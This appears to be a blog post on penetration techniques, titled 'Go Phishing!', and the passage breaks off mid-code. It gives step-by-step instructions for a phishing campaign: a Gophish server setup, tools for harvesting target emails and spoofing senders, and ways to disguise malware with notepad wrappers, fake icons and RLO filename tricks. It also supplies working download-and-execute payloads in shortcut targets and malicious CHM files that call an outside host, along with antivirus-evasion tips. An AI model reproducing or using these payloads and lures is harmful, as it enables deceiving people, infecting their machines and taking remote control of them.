<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Computer, Network, Security">
    <meta name="description" content="a blog on Hexo">
    <meta name="author" content="TyeYeah">
    
    <title>
        
            Go Phishing! |
        
        Relish the Moment
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
        <link rel="shortcut icon" href="/img/wang.svg">
    
    
<link rel="stylesheet" href="/font/css/fontawesome.min.css">

    
<link rel="stylesheet" href="/font/css/regular.min.css">

    
<link rel="stylesheet" href="/font/css/solid.min.css">

    
<link rel="stylesheet" href="/font/css/brands.min.css">

    
    <script class="keep-theme-configurations">
    const KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"}
    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"style":{"primary_color":"#0066cc","logo":"/images/logo.svg","favicon":"/img/wang.svg","avatar":"/img/aliwangwang.svg","first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"scroll":{"progress_bar":false,"percent":false}},"local_search":{"enable":true,"preload":true},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Gamer","Learner"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"version":"3.8.5"}
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original article title","author":"Original article author","link":"Original article link"}
  </script>
<meta name="generator" content="Hexo 5.4.2"></head>


<body>
<div class="progress-bar-container">
    

    
</div>


<main class="page-container border-box">

    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left border-box">
            
                <a class="logo-image border-box" href="/">
                    <img src="/images/logo.svg">
                </a>
            
            <a class="site-name border-box" href="/">
               Relish the Moment
            </a>
        </div>

        <div class="right border-box">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                HOME
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                ARCHIVES
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                CATEGORIES
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                TAGS
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                ABOUT
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">HOME</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">ARCHIVES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">CATEGORIES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">TAGS</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">ABOUT</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">

                

                    <div class="fade-in-down-animation">
    <div class="post-page-container border-box">

        <div class="article-content-container border-box">

            

            <div class="article-content-bottom border-box">
                
                    <div class="article-title">
                        Go Phishing!
                    </div>
                

                
                    <div class="article-header border-box">
                        
                            <div class="avatar-box border-box">
                                <img src="/img/aliwangwang.svg">
                            </div>
                        
                        <div class="info-box">
                            <div class="author">
                                <span class="name">TyeYeah</span>
                                
                                    <span class="author-label">Lv4</span>
                                
                            </div>
                            <div class="meta-info border-box">
                                

<div class="article-meta-info-container border-box post">
    <div class="article-meta-info border-box">
        


        
            <span class="meta-info-item article-create-date">
                <i class="icon fa-solid fa-calendar-check"></i>&nbsp;
                <span class="pc">2022-08-06 17:05:01</span>
                <span class="mobile">2022-08-06 17:05</span>
            </span>

            <span class="meta-info-item article-update-date">
                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                <span class="pc" data-updated="Sun Nov 27 2022 16:27:50 GMT+0800">2022-11-27 16:27:50</span>
            </span>
        

        
            <span class="meta-info-item article-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                <ul class="article-category-ul">
                    
                            <li class="category-item"><a href="/categories/Penetration-Testing/">Penetration Testing</a></li>
                        
                    
                </ul>
            </span>
        

        
            <span class="article-tag meta-info-item border-box">
                <i class="icon fas fa-tags"></i>&nbsp;
                <ul class="article-tag-ul">
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/linux/">linux</a></li>
                        
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/windows/">windows</a></li>
                        
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/pentest/">pentest</a></li>
                        
                    
                </ul>
            </span>
        

        
        
            <span class="meta-info-item article-wordcount">
                <i class="icon fas fa-file-word"></i>&nbsp;<span>4k Words</span>
            </span>
        
        
            <span class="meta-info-item article-min2read">
                <i class="icon fas fa-clock"></i>&nbsp;<span>24 Mins</span>
            </span>
        
        
    </div>

    
</div>

                            </div>
                        </div>
                    </div>
                

                <div class="article-content keep-markdown-body">
                    

                    <p>This article shows methods of phishing, including setting up a phishing mail server, preparing malware (PE) which deceives the target to access, and preparing evil documents&#x2F;tables based on Office suite.</p>
<h2 id="Set-Up-Phishing-Mail-Server"><a href="#Set-Up-Phishing-Mail-Server" class="headerlink" title="Set Up Phishing Mail Server"></a>Set Up Phishing Mail Server</h2><p>Buy similar domains, and prepare two server, one for mail server and another for phishing server.</p>
<p>Phishing server:</p>
<ul>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/gophish/gophish" >Gophish<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://gitee.com/laowu5/EwoMail" >EwoMail<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>To use <a class="link"   target="_blank" rel="noopener" href="https://github.com/gophish/gophish" >Gophish<i class="fas fa-external-link-alt"></i></a>, download the <a class="link"   target="_blank" rel="noopener" href="https://github.com/gophish/gophish/releases" >releases<i class="fas fa-external-link-alt"></i></a> and configure the <code>config.json</code>.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/gophish]</span><br><span class="line">‚îî‚îÄ<span class="comment"># unzip gophish-v0.11.0-linux-64bit.zip</span></span><br><span class="line">Archive:  gophish-v0.11.0-linux-64bit.zip</span><br><span class="line">  inflating: gophish</span><br><span class="line">   creating: static/js/dist/</span><br><span class="line">   creating: static/js/dist/app/</span><br><span class="line">  inflating: static/js/dist/app/landing_pages.min.js</span><br><span class="line">    ...</span><br><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/gophish]</span><br><span class="line">‚îî‚îÄ<span class="comment"># ls</span></span><br><span class="line">config.json  gophish                          LICENSE    static     VERSION</span><br><span class="line">db           gophish-v0.11.0-linux-64bit.zip  README.md  templates</span><br><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/gophish]</span><br><span class="line">‚îî‚îÄ<span class="comment"># chmod +x gophish</span></span><br></pre></td></tr></table></figure>
<p>Modify the content of <code>config.json</code>:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;admin_server&quot;</span>: &#123;</span><br><span class="line">		<span class="attr">&quot;listen_url&quot;</span>: <span class="string">&quot;0.0.0.0:xx&quot;</span>, <span class="comment">// port to manage (https)</span></span><br><span class="line">		<span class="attr">&quot;use_tls&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">		<span class="attr">&quot;cert_path&quot;</span>: <span class="string">&quot;gophish_admin.crt&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;key_path&quot;</span>: <span class="string">&quot;gophish_admin.key&quot;</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">&quot;phish_server&quot;</span>: &#123;</span><br><span class="line">		<span class="attr">&quot;listen_url&quot;</span>: <span class="string">&quot;0.0.0.0:xxxx&quot;</span>, <span class="comment">// port to phish (https)</span></span><br><span class="line">		<span class="attr">&quot;use_tls&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">		<span class="attr">&quot;cert_path&quot;</span>: <span class="string">&quot;example.crt&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;key_path&quot;</span>: <span class="string">&quot;example.key&quot;</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">&quot;db_name&quot;</span>: <span class="string">&quot;sqlite3&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;db_path&quot;</span>: <span class="string">&quot;gophish.db&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;migrations_prefix&quot;</span>: <span class="string">&quot;db/db_&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;contact_address&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;logging&quot;</span>: &#123;</span><br><span class="line">		<span class="attr">&quot;filename&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;level&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Start server, and it will show the initial username &amp; password.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/gophish]</span><br><span class="line">‚îî‚îÄ<span class="comment"># ./gophish</span></span><br><span class="line">time=<span class="string">&quot;2022-08-08T16:05:08+08:00&quot;</span> level=warning msg=<span class="string">&quot;No contact address has been configured.&quot;</span></span><br><span class="line">time=<span class="string">&quot;2022-08-08T16:05:08+08:00&quot;</span> level=warning msg=<span class="string">&quot;Please consider adding a contact_address entry in your config.json&quot;</span></span><br><span class="line">goose: migrating db environment <span class="string">&#x27;production&#x27;</span>, current version: 0, target: 20200730000000</span><br><span class="line">OK    20160118194630_init.sql</span><br><span class="line">OK    20160131153104_0.1.2_add_event_details.sql</span><br><span class="line">...</span><br><span class="line">OK    20200619000000_0.11.0_password_policy.sql</span><br><span class="line">OK    20200730000000_0.11.0_imap_ignore_cert_errors.sql</span><br><span class="line">time=<span class="string">&quot;2022-08-08T16:05:09+08:00&quot;</span> level=info msg=<span class="string">&quot;Please login with the username admin and the password e98a19c956ca1cc2&quot;</span></span><br><span class="line">time=<span class="string">&quot;2022-08-08T16:05:09+08:00&quot;</span> level=info msg=<span class="string">&quot;Starting phishing server at http://0.0.0.0:xxx&quot;</span></span><br><span class="line">time=<span class="string">&quot;2022-08-08T16:05:09+08:00&quot;</span> level=info msg=<span class="string">&quot;Starting IMAP monitor manager&quot;</span></span><br></pre></td></tr></table></figure>

<p>As for EwoMail, it has detailed documents.</p>
<p>Collect target email:</p>
<ul>
<li><a class="link"   target="_blank" rel="noopener" href="https://hunter.io/" >https://hunter.io/<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="http://www.skymem.info/" >http://www.skymem.info/<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://www.email-format.com/i/search/" >https://www.email-format.com/i/search/<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/bit4woo/teemo" >https://github.com/bit4woo/teemo<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/laramies/theHarvester" >https://github.com/laramies/theHarvester<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>Verify email:</p>
<ul>
<li><a class="link"   target="_blank" rel="noopener" href="https://mailtester.com/testmail.php" >https://mailtester.com/testmail.php<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/Tzeross/verifyemail" >https://github.com/Tzeross/verifyemail<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/angusluk/MailTester" >https://github.com/angusluk/MailTester<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>Fake an account</p>
<ul>
<li><a class="link"   target="_blank" rel="noopener" href="http://www.jetmore.org/john/code/swaks/" >http://www.jetmore.org/john/code/swaks/<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="http://tool.chacuo.net/mailanonymous" >http://tool.chacuo.net/mailanonymous<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="http://tool.chacuo.net/mailsend" >http://tool.chacuo.net/mailsend<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<h2 id="Camouflage-Malicious-PE"><a href="#Camouflage-Malicious-PE" class="headerlink" title="Camouflage Malicious PE"></a>Camouflage Malicious PE</h2><p>FIrst of all we need PE backdoor which can be created by using <a href="/2020/03/12/2020-03-12-Domain-Pentest-Intro/#Pentest-framework">Pentest Frameworks</a>.</p>
<p>Or we can prepare evil Powershell scripts using MSF, CobaltStrike, <a class="link"   target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire" >Empire<i class="fas fa-external-link-alt"></i></a> and <a class="link"   target="_blank" rel="noopener" href="https://github.com/trustedsec/unicorn" >Unicorn<i class="fas fa-external-link-alt"></i></a>, and pack it up as an executable using tools like <a class="link"   target="_blank" rel="noopener" href="https://github.com/tokyoneon/B2E/raw/master/Bat_To_Exe_Converter.zip" >BAT2EXE<i class="fas fa-external-link-alt"></i></a>.</p>
<p>We can setup to use or leverage the portable version. Add a <code>notepad.exe</code> at the front as a disguise, and remember to set a reliable icon (can be found at <a class="link"   target="_blank" rel="noopener" href="https://github.com/B00merang-Artwork/Windows-10" >Windows 10 Icon theme<i class="fas fa-external-link-alt"></i></a>) and right PE format.<br><img src="/imghost/gp/1.png" alt="notepad as a disguise"><br><img src="/imghost/gp/2.png" alt="icon and format"></p>
<p>After that we get <code>xxx.exe</code>, and here the most important tip appears ‚Äì Unicode of RLO. It converts filename to write from the right to the left. Use <code>insert</code> in right click menu, or visit online tools like <a class="link"   target="_blank" rel="noopener" href="https://unicode-table.com/en/202E/" >Unicode Character Table<i class="fas fa-external-link-alt"></i></a> to do it.</p>
<p>For example, if we name a file: <code>Altxt.exe</code>, and <code>insert</code> RLO right before the <code>txt.exe</code>, finally we get name <code>Alexe.txt</code> and it is still a PE file.</p>
<p><a href="Restorator">Restorator</a> can be used to edit resource of a PE file.</p>
<h3 id="SFX"><a href="#SFX" class="headerlink" title="SFX"></a>SFX</h3><p>Create a SFX(SelF-eXtracting) file and compress in some confusing binaries. Set Advanced settings of SFX:</p>
<ul>
<li>before extraction, run a normal PE; after extraction, run the malware.</li>
<li>configure the silence mode to <code>hide all</code>.</li>
<li><code>update</code> and <code>overlap</code> files when extracting.</li>
</ul>
<h3 id="DLL-Hijacking-amp-Recreate-the-Installer"><a href="#DLL-Hijacking-amp-Recreate-the-Installer" class="headerlink" title="DLL Hijacking &amp; Recreate the Installer"></a>DLL Hijacking &amp; Recreate the Installer</h3><p>They are also common methods to execute malware, and here provide some sample tools:</p>
<ul>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/strivexjun/AheadLib-x86-x64" >AheadLib<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/coca1ne/DLL_Hijacker" >DLL_Hijacker<i class="fas fa-external-link-alt"></i></a></li>
<li>other dll hijacking tools</li>
<li><a class="link"   target="_blank" rel="noopener" href="https://nsis.sourceforge.io/Download" >NSIS<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://jrsoftware.org/isinfo.php" >Inno Setup<i class="fas fa-external-link-alt"></i></a></li>
<li>Easy setup</li>
</ul>
<h2 id="Make-Evil-Links-x2F-Shotcuts"><a href="#Make-Evil-Links-x2F-Shotcuts" class="headerlink" title="Make Evil Links&#x2F;Shotcuts"></a>Make Evil Links&#x2F;Shotcuts</h2><p>We can create a blank shotcut, and modify the target command.</p>
<p>For example, <code>ftp</code> can be used to execute commands by adding <code>!</code>:  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># ftp</span><br><span class="line">ftp&gt; whoami</span><br><span class="line">?Invalid command.</span><br><span class="line">ftp&gt; !whoami</span><br><span class="line">root</span><br><span class="line">ftp&gt; !echo 222</span><br><span class="line">222</span><br><span class="line">ftp&gt; !pwd</span><br><span class="line">/root</span><br><span class="line">ftp&gt;</span><br></pre></td></tr></table></figure>
<p>So on Windows the <code>ftp.exe</code> can cooperate with <code>powershell</code> scripts.<br>In <code>Target</code> of the <code>Shotcut</code> we write: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Winodws\System32\ftp.exe -&quot;&quot;s:xxx.dll</span><br></pre></td></tr></table></figure>
<p>In <code>xxx.dll</code> we write: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!cmd /k powershell -exec bypass .\xxxx.ps1</span><br></pre></td></tr></table></figure>
<p>And in <code>xxxx.ps1</code> writes:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x:xx/xxxxx&#x27;))&quot;</span><br></pre></td></tr></table></figure>

<p>In this indirectly calling method, some antivirus softwares can be bypassed. Other methods of calling powershell are also applicable, and encodings like base64 are recommended.</p>
<p>The name of icon of the file should be modified to deceive others.</p>
<h2 id="Evil-CHM-to-Phish"><a href="#Evil-CHM-to-Phish" class="headerlink" title="Evil CHM to Phish"></a>Evil CHM to Phish</h2><p>CHM (Microsoft Compiled HTML Help) is the extension used by Windows help files and other files such as e-books. Cybercriminals have been known to abuse vulnerabilities in CHM files to execute arbitrary code. Successful exploitation requires the user is tricked into opening or decompiling a malicious CHM file, which may be used to execute malicious routines the same way a malicious EXE file would.</p>
<p>First create an empty folder, and a html file:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Mousejack replay<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">command exec </span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;,calc.exe&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;273,1,1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">x.Click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Attention: a <code>,</code> before <code>calc.exe</code> is needed to avoid chm error when opening.</p>
<p>Use EasyCHM or other tools to produce CHM files based on html, and click to trigger payload. replace payload with powershell to get trojan online.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Mousejack replay<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">command exec </span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;,powershell.exe, -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x:xx/xxxxx&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;273,1,1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">x.Click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Attention: a <code>,</code> right after <code>powershell.exe</code> is also needed to avoid error, and take care of conflicts between <code>&quot;</code> and <code>&#39;</code>.</p>
<p>Another method is to leverage <a class="link"   target="_blank" rel="noopener" href="https://github.com/Ridter/MyJSRat" >MyJSRat<i class="fas fa-external-link-alt"></i></a>. The payload in CHM should connect <code>MyJSRat</code> server (control indirectly), and <code>MyJSRat</code> control the victim to execute powershell backdoor downloading&amp;execution. </p>
<p>The CHM content can be like: (using whitelist and clean traces)</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Mousejack replay<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">command exec </span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;,rundll32.exe, javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.27.180:8081/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;273,1,1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span></span><br><span 